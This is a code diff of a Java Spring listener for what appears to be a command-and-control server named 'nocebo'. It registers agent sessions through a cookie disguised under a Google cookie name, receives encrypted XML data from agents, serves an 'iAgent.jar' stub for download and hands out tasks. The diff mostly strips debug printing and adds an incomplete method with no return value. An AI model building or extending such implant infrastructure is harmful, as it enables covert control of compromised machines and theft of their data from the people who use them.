@@ -103,8 +103,6 @@ public class ListenerApplication {
 		{
 			session sessionData;
 			String currentKey;
-			//validate auth first
-			System.out.println(requestData);
 
 			if (!epc.sessionTable.containsKey(idCookie))
 			{
@@ -147,7 +145,6 @@ public class ListenerApplication {
 			for (int d=0;d<downstreamData.size();d++)
 			{
 				String downstreamUUID = downstreamData.get(d).toString();
-				System.out.println(downstreamUUID);
 				if (!sessionData.downstream.contains(downstreamUUID) && !downstreamUUID.equals(""))
 				{
 					sessionData.downstream.add(downstreamUUID);
@@ -184,8 +181,6 @@ public class ListenerApplication {
 		String data(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
-			System.out.println("receiving data");
-			System.out.println(requestData.replace("=",""));
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
@@ -213,8 +208,6 @@ public class ListenerApplication {
 					)
 				)
 			);
-			System.out.println("printing data");
-			System.out.println(xmlParsed.toString());
 
 			sessionData.data.add(xmlParsed);
 
@@ -272,8 +265,6 @@ public class ListenerApplication {
 		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
 		@ResponseBody byte[] downloadStub() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
-			System.out.println("stub downloading");
-			//encrypt
 
 
 			String filePath = String.format("..%sfileroot%slib%siAgent.jar",File.separator,File.separator,File.separator,File.separator);
@@ -298,7 +289,6 @@ public class ListenerApplication {
 		@PostMapping("/tasking")
 		String ctrl(@RequestBody Map<String, Object> requestData, @RequestHeader("nClient-key") String clientApiKey) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
 		{
-			System.out.println((String) requestData.get("uuid"));
 			if (!clientApiKey.equals(epc.apiPass))
 			{
 				return "Fatal Error: Incorrect API key";
@@ -314,7 +304,6 @@ public class ListenerApplication {
 				{
 					String sessionKey = k.nextElement();
 					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
-					System.out.println(sessionKey);
 					if (tempSessionData.downstream.contains((String) requestData.get("uuid")))
 					{
 						sessionData.add(tempSessionData);
@@ -353,9 +342,7 @@ public class ListenerApplication {
 		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
 		String log(@RequestHeader("nClient-key") String clientApiKey)
 		{
-
-
-				
+		
 			if (!clientApiKey.equals(epc.apiPass))
 			{
 				return "Fatal Error: Incorrect API key";
@@ -533,6 +520,16 @@ class noceboApi
 				cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
 			);
 			return new String(Base64.getEncoder().encode(encodedHash));
+		}
+
+		public Document hashtableToXmlDoc(String rootElement, Hashtable genericHashtable)
+		{
+			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
+			DocumentBuilder constructor = manufactorum.newDocumentBuilder();
+
+			Document doc = constructor.newDocument();
+
+			Element root = doc.createElement(rootElement);
 		}
 
 		//<response><nonce data=""></nonce><cookie data=""><key data=""></key></cookie><task class="" method="" args="b64">b64moddata</task></response>
